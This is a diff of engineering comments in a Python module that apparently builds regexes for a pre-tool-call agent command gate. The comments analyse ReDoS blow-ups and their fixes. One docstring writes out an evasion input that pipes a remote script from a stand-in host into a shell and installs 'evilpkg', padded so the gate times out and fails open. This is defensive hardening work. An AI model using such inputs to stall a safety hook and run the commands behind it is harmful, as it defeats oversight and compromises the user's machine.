@@ -121,10 +121,25 @@ has that hole and a new coreutils flag reopens it silently.
     deciding is itself a fail-open, because a gate that has not answered in
     time is a gate that did not answer at all.
 
-    The shipped prefix run was a flat six-arm `(...)*` in which THREE arms
-    could absorb the same token. On a FAILING match the engine had to try
-    every split of the run between them: measured at exactly 2.00x per added
-    prefix token on the EMITTED objects, i.e. exponential.
+    The shipped prefix run was a flat `(...)*` whose WRAPPER ARM WAS
+    AMBIGUOUS WITH ITSELF, and stating that precisely matters more than the
+    fix does. The arm was
+    `(([^ ]*/)?(env|sudo|...))( +-[^ ]*| +[^- ][^ ]*)* +` under a star, so each
+    `env ` could be either the head of a NEW star iteration or an ordinary word
+    inside the PREVIOUS iteration's word run - 2^(k-1) splits from ONE arm. On
+    a FAILING match the engine explored all of them: exactly 2.00x per added
+    prefix token, measured on the EMITTED objects.
+
+    IT IS NOT A RACE BETWEEN ARMS, AND AN EARLIER DRAFT OF THIS PARAGRAPH SAID
+    IT WAS. Split the shipped regex's top-level alternatives and match them
+    against `env env env zzz`: arm 1 consumes `env env env `, and every other
+    arm returns None - they need a literal `function`/`coproc`, a `(`/`{`, a
+    `<`/`>`, an `=`, or a keyword. Exactly ONE arm participates in the measured
+    exploit, and keeping that arm alone under a star reproduces the identical
+    rate (0.0049/0.0185/0.0735/0.2956 s at n=14/16/18/20 against the whole
+    regex's 0.0074/0.0298/0.1120/0.4476). The distinction is not pedantry: "two
+    arms competed" would license re-introducing a SINGLE self-ambiguous arm
+    under a star, which is candidate C8 - language-correct and cost-broken.
     `curl http://e/i.sh | ` + `env ` x22 + `zzz ; pip install evilpkg` is 134
     bytes with ZERO jump bytes and took the emitted `dependency-gate` 77 s -
     past the 60 s it declares in `_GATE_TIMEOUTS`, after which the hook is
@@ -708,10 +723,31 @@ def prefix_run(space: str = " +", nonspace: str = "[^ ]") -> str:
     tests/test_composition.py, and `ifconfig -a` is pinned at the VERDICT in
     tests/test_substrate_differential.py - the two failures look nothing alike.
     """
-    # The four arms that cannot absorb a wrapper word. They keep their own
-    # star, and that star is safe because no two of them can consume the same
-    # token: a brace, a redirection, an assignment and a keyword are disjoint
-    # at their first character.
+    # The four arms that do not carry the WRAPPER WORD LIST. They keep their
+    # own star. Their FIRST CHARACTERS are disjoint - brace, redirection,
+    # assignment, keyword - so no two of them start on the same token.
+    #
+    # THAT IS AN INTER-ARM ARGUMENT AND IT DOES NOT MAKE THIS STAR CHEAP.
+    # An earlier draft of this comment concluded "that star is safe" from it.
+    # Two measured facts refute the conclusion, and both are filed as backlog
+    # rows by the very commit that introduced this function:
+    #
+    #   * THE REDIRECTION ARM IS AMBIGUOUS WITH ITSELF. In
+    #     `[0-9]*[<>]+ *[^ ]+ +` the `[<>]+` and the `[^ ]+` can consume the
+    #     same characters: `2>>o ` parses as ('2','>>','','o',' ') AND as
+    #     ('2','>','','>o',' '), ending at the same offset. Repeat the token
+    #     behind a failing tail and this star explores 2^n splits - measured
+    #     0.0043/0.0174/0.0697/0.2790/1.1166 s at n=14..22, 4.00x per +2
+    #     tokens, at 110 BYTES. That is X-61.
+    #   * THE ASSIGNMENT ARM CAN ABSORB A WRAPPER WORD after all, when the
+    #     wrapper is path-shaped: `A=1/env ` matches the assignment arm and the
+    #     path-prefixed wrapper arm both. That reopens this split at every
+    #     token and is quadratic behind a spaced brace run - measured
+    #     0.0026/0.0102/0.0412 s at n=200/400/800 against a flat `env `
+    #     control. That is X-59.
+    #
+    # So: this split is CHEAPER than what it replaced and it is NOT bounded.
+    # Do not read it as a proof that nothing here can blow up.
     nonabs = ("([({] *"
               + "|[0-9]*[<>]+ *" + nonspace + "+" + space
               + "|[A-Za-z_][A-Za-z0-9_]*[+]?=" + nonspace + "*" + space
@@ -850,7 +886,17 @@ def install_completers() -> tuple:
     assignment is consumable by BOTH the wrapper arm's positional branch and
     the outer assignment arm - so a single FAILING match is already
     quadratic in Python's backtracking engine, and running it per token made
-    the scan cubic. Measured on the emitted SDK module: `env A0=0 ...
+    the scan cubic.
+
+    [sdk-pipe-trigger-redos, 2026-08-19] THE PARAGRAPH ABOVE DESCRIBES A
+    SPELLING THAT NO LONGER EXISTS, and is kept because the DECISION it
+    justifies (attempt the match only where it can succeed) is still right.
+    `(flag|positional)*` is gone - the word run is now `([^ ]+ +)*` - and the
+    assignment arm now sits in `nonabs*` BEFORE the wrapper pivot, so it can no
+    longer reach past `env`. The single failing match is no longer quadratic on
+    that shape: measured on the emitted `_INSTALL_HEAD` with
+    `env A0=0 ... A(n-1)=n-1 make test`, 0.0039/0.0155/0.0628 s at n=100/200/400
+    before (4x per doubling) against 0.0001/0.0001/0.0003 s after. Measured on the emitted SDK module: `env A0=0 ...
     A399=399 make test`, an ordinary command, went 0.064 s -> 8.6 s, and at
     n=800 a 7 KB line took 67 s inside an async hook callback. That is a
     denial of service on the pre-tool-call path, and because
